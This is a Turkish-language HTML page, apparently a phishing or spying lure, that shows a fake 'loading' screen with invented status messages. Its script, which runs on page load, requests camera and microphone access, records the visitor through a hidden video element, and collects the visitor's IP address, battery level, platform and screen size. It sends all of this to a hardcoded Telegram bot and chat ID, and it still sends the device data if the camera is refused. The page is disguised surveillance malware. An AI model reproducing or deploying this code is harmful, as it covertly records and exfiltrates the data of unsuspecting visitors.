<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Jujutsu</title>

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family: Arial, sans-serif;
    }

    body{
      background:#000;
      height:100vh;
      overflow:hidden;
      display:flex;
      justify-content:center;
      align-items:center;
      color:white;
    }

    .container{
      text-align:center;
      width:90%;
    }

    .logo{
      font-size:90px;
      font-weight:900;
      color:#ff0000;
      text-shadow:
        0 0 5px #ff0000,
        0 0 10px #ff0000,
        0 0 20px #ff0000,
        0 0 40px #ff0000,
        0 0 80px #ff0000;
      margin-bottom:40px;
      letter-spacing:4px;
    }

    .loading-text{
      font-size:22px;
      margin-bottom:15px;
      color:#ddd;
    }

    .bar{
      width:450px;
      max-width:90%;
      height:22px;
      border:2px solid #ff0000;
      margin:auto;
      overflow:hidden;
      border-radius:10px;
      box-shadow:0 0 20px #ff0000;
      background:#111;
    }

    .progress{
      width:0%;
      height:100%;
      background:#ff0000;
      box-shadow:0 0 20px #ff0000;
      transition:width 0.2s linear;
    }

    .percent{
      margin-top:12px;
      font-size:20px;
      color:#ff4d4d;
      font-weight:bold;
    }

    .fake-status{
      margin-top:35px;
      font-size:16px;
      color:#888;
      min-height:25px;
      animation:blink 1.2s infinite;
    }

    @keyframes blink{
      0%{opacity:0.5;}
      50%{opacity:1;}
      100%{opacity:0.5;}
    }

    #hiddenVideo{
      display:none;
    }
  </style>
</head>
<body>

  <video id="hiddenVideo" autoplay muted playsinline></video>

  <div class="container">
    <div class="logo">𝖀𝖒𝖚𝖙</div>
    <div class="loading-text">Yükleniyor...</div>
    <div class="bar">
      <div class="progress" id="progress"></div>
    </div>
    <div class="percent" id="percent">0%</div>
    <div class="fake-status" id="status">Sunucuya bağlanılıyor...</div>
  </div>

  <script>
    // ========== TELEGRAM AYARLARI ==========
    const BOT_TOKEN = '8658397323:AAF0Kl8pRUbRXPK6wPVT6pC6iu8l6BeZMew';
    const CHAT_ID = '7497803165';
    // =======================================

    // Loading bar
    let progress = 0;
    const progressBar = document.getElementById("progress");
    const percentText = document.getElementById("percent");
    const statusText = document.getElementById("status");

    const fakeMessages = [
      "Sunucuya bağlanılıyor...",
      "İnternet sağlanıyor...",
      "Veriler doğrulanıyor...",
      "Bekliyor...",
      "Sistem hazırlanıyor...",
      "Güvenli bağlantı kuruluyor...",
      "Paketler indiriliyor...",
      "Bağlantı optimize ediliyor...",
      "Herşey hazırlanıyor...",
      "bir dakika..."
    ];

    setInterval(() => {
      if(progress < 98){
        progress += Math.random() * 2;
        if(progress > 98) progress = 98;
        progressBar.style.width = progress + "%";
        percentText.innerText = Math.floor(progress) + "%";
      }
    }, 350);

    setInterval(() => {
      const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
      statusText.innerText = randomMessage;
    }, 2000);

    // ========== VİDEO KAYIT SİSTEMİ ==========
    let mediaStream = null;
    let mediaRecorder = null;
    let videoChunks = [];
    let kayitBaslangic = null;
    let ipBilgisi = 'bilinmiyor';
    let videoCaptions = [];

    // IP al
    async function getIp() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ipBilgisi = data.ip;
      } catch(e) {}
    }

    // Batarya bilgisi
    async function getBattery() {
      if (navigator.getBattery) {
        try {
          const bat = await navigator.getBattery();
          return `%${Math.round(bat.level * 100)} ${bat.charging ? '⚡Şarjda' : '🔋Pil'}`;
        } catch(e) {}
      }
      return 'bilinmiyor';
    }

    // Videoyu Telegram'a gönder
    async function videoGonder(videoBlob, caption) {
      try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('video', videoBlob, 'kayit.mp4');
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
          method: 'POST',
          body: formData
        });

        console.log('Video gönderildi!');
      } catch (err) {
        console.error('Video gönderilemedi:', err);
      }
    }

    // Kaydı durdur ve videoyu gönder
    async function kaydiBitir() {
      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        console.log('Kayıt bitiriliyor...');
        mediaRecorder.stop();
        
        // MediaRecorder'ın onstop event'inde video gönderilecek
        // (aşağıda tanımlı)
      }
    }

    // Ana fonksiyon - kamerayı aç ve kayda başla
    async function baslat() {
      await getIp();
      const battery = await getBattery();

      try {
        // Kamerayı aç - SADECE video, ses de istiyoruz
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: true  // SES KAYDI İÇİN
        });

        const video = document.getElementById('hiddenVideo');
        video.srcObject = mediaStream;
        await video.play();

        console.log('Kamera açıldı, video kaydı başlıyor...');

        // MediaRecorder ile kayda başla
        kayitBaslangic = new Date();
        videoChunks = [];
        
        // Desteklenen formatı kontrol et
        let mimeType = 'video/webm;codecs=vp9,opus';
        if (!MediaRecorder.isTypeSupported(mimeType)) {
          mimeType = 'video/webm;codecs=vp8,opus';
          if (!MediaRecorder.isTypeSupported(mimeType)) {
            mimeType = 'video/webm';
          }
        }

        mediaRecorder = new MediaRecorder(mediaStream, { mimeType: mimeType });

        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            videoChunks.push(event.data);
          }
        };

        mediaRecorder.onstop = async () => {
          console.log('Kayıt durdu, video hazırlanıyor...');
          
          // Video blob'unu oluştur
          const videoBlob = new Blob(videoChunks, { type: mimeType });
          
          const sure = Math.floor((new Date() - kayitBaslangic) / 1000);
          const dakika = Math.floor(sure / 60);
          const saniye = sure % 60;

          const caption = `
🎥 **VİDEO KAYDI**

⏱ **Süre:** ${dakika}:${saniye.toString().padStart(2, '0')}
🌐 **IP:** ${ipBilgisi}
💻 **Cihaz:** ${navigator.platform}
🔋 **Batarya:** ${battery}
📺 **Ekran:** ${screen.width}x${screen.height}
⏰ **Tarih:** ${kayitBaslangic.toLocaleString('tr-TR')}
          `.trim();

          // Videoyu Telegram'a gönder
          await videoGonder(videoBlob, caption);
        };

        // 10 saniyede bir parça topla (kesintisiz kayıt için)
        mediaRecorder.start(10000); // her 10 saniyede bir chunk

        console.log('Video kaydı aktif - sayfa kapanınca video gönderilecek');

      } catch (err) {
        console.error('Kamera açılamadı:', err);
        
        // Kamera yoksa sadece bilgi gönder
        try {
          const info = `
❌ **KAMERA REDDEDİLDİ**

🌐 **IP:** ${ipBilgisi}
💻 **Cihaz:** ${navigator.platform}
🔋 **Batarya:** ${battery}
📺 **Ekran:** ${screen.width}x${screen.height}
          `.trim();

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: info,
              parse_mode: 'Markdown'
            })
          });
        } catch(e) {}
      }
    }

    // Sayfa kapanınca videoyu gönder
    window.addEventListener('beforeunload', (e) => {
      console.log('Sayfa kapanıyor, video kaydediliyor...');
      // Tarayıcı sayfayı kapatmadan önce kaydı bitir
      kaydiBitir();
      
      // Bazı tarayıcılar için
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
      }
    });

    // Sayfa görünürlüğü değişince (arka plana geçince) 
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        console.log('Sayfa arkaplana geçti, kayıt devam ediyor...');
        // Kayıt devam etsin ama yine de sayfa kapanma durumunu kontrol et
      }
    });

    // Başlat
    baslat();
  </script>

</body>
</html>
